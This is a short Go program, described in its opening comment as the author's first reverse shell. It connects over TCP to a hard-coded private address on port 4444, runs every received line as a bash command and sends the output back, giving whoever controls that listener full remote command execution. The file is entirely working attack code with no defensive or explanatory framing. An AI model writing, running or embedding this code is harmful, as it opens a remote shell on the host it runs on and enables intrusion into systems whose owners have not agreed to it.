//this is my first reverse shell written in go lang
package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
)

func main() {
	shell("10.0.0.24:4444")
}

func shell(host string) {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		log.Fatal(err)
	}

	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command("bash", "-c", message).CombinedOutput()
		if err != nil {
			fmt.Println(err)
		}
		conn.Write(out)
	}
}
